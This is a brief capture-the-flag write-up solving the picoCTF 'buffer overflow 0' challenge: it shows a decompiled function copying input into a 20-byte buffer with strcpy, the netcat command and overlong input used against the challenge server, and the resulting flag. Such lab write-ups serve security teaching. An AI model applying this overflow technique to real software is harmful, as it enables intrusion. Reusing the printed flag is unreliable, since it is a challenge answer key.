# buffer overflow 0 Writeup

## Steps:
1. Open in ghidra and analyze
	- Notice function called `vuln`
 ```
void vuln(char *param_1)

{
  char local_1c [20];
  
  strcpy(local_1c,param_1);
  return;
}
```
2. local_1c has a size of 20, so if our input is longer it will overflow the buffer, triggering sigsegv_handler() and printing the flag

## Solution:
```
$ nc saturn.picoctf.net 52311
Input: aaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
